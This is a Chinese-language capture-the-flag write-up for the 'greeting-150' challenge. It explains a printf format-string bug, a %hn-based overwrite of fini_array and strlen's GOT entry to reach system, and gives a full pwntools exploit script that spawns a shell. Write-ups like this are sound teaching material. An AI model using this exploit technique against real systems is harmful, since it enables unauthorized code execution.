根据writeup第三条分析而来：
$ checksec greeting-150
[*] '/home/davidcr/Downloads/CTF/master_pwn/0x17/greeting-150'    
Arch:     i386-32-little    
RELRO:    No RELRO    
Stack:    Canary found    
NX:       NX enabled    
PIE:      No PIE (0x8048000)


本题代码：

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  int v4; // edx@4
  int v5; // [sp+1Ch] [bp-84h]@2
  int v6; // [sp+5Ch] [bp-44h]@1
  int v7; // [sp+9Ch] [bp-4h]@1

  v7 = *MK_FP(__GS__, 20);
  printf("Please tell me your name... ");
  if ( getnline((char *)&v6, 64) )
  {
    sprintf((char *)&v5, "Nice to meet you, %s :)\n", &v6);
    result = printf((const char *)&v5);
  }
  else
  {
    result = puts("Don't ignore me ;( ");
  }
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}

很明显    result = printf((const char *)&v5);
存在格式化字符串漏洞。

dudu@kali:~/桌面/learn/pwn/xctf/进阶$ ./greeting-150 
Hello, I'm nao!
Please tell me your name... AAAAAAAA -%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-
Nice to meet you, AAAAAAAA -0x80487d0-0xffbb282c-(nil)-(nil)-(nil)-(nil)-0x6563694e-0x206f7420-0x7465656d-0x756f7920-0x4141202c-0x41414141-0x2d204141-0x252d7025-0x70252d70- :)


利用：
由于v6只有64字节（payload长度不能大于64），考虑到空间问题，所以要精心布置。
writeup中采用：
在printf的格式化修饰符中，hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)


fini_got = 0x8049934  
main_addr = 0x80485ED  
strlen_got = 0x8049A54  
system_plt = 0x8048490  
此处的数据，只有后2字节与main_addr不一样，因此，我们只需要修改后两字节。

然后就是strlen的GOT表内容，四个字节我们都需要修改，我们拆分为2个2字节写。

payload的结构如下：
aa
[fini_array    ] [strlen_got + 2] [strlen_got    ]
(%34000c%12$hn ) (%33556c%13$hn ) (%31884c%14$hn )
这里的 12，13，14 偏移分别对应输入的 fini_array，strlen_got + 2，strlen_got

[offset 12] (s + 0x2) fini_array 
[offset 13] (s + 0x6) strlen_got + 2
[offset 14] (s + 0xA) strlen_got
这里的 $hn 只写两个字节，首先在 fini_array 处写入了 0x20（strlen（"Nice to meet you "）【18】+strlen("aa")【2】+3个地址的长度【3*8】） + 34000 即 0x84f0，即 _start 函数的低两位字节，当 main 函数运行完毕后会再次进入main 函数。在 strlen_got + 2 处写了 0x84f0 + 33556 = 0x10804，由于只写两位字节，多余的 0x10000 作废了。同理，在 strlen_got 处写了0x10804 + 31884 = 0x19AC0，多余的 0x10000 作废。至此，strlen_got 指向 0x08049AC0 即 system 函数地址。

注意：
fini_got = 0x8049934  
main_addr = 0x80485ED  
strlen_got = 0x8049A54  
system_plt = 0x8048490  
其中fini_got与main_addr的高地址相同，都是0804
所以只需要更改低地址


代码:
from pwn import *
if len(sys.argv) < 2:    
    sh= process('./greeting-150')
else:    
    sys_argv = sys.argv[1].split(':')    
    sh = remote(sys_argv[0], int(sys_argv[1]))

#sh=remote('111.198.29.45',37802)
elf=ELF('./greeting-150')
fini_array=0x08049934
start=0x080484f0
system_plt=elf.plt['system']
strlen_got=elf.got['strlen']
print "strlen_got: "+hex(strlen_got)
print "system_plt: "+hex(system_plt)
print "fini_array: "+hex(fini_array)
print "start: "+hex(start)

sh.recv()
payload='aa'+p32(fini_array)+p32(strlen_got+2)
payload+=p32(strlen_got)+'%34000c%12$hn'
payload+='%33556c%13$hn'
payload+='%31884c%14$hn'
sh.sendline(payload)
sh.recv()

sh.sendline('/bin/sh\x00')
sh.recvuntil('Please tell me your name... ')
sh.interactive()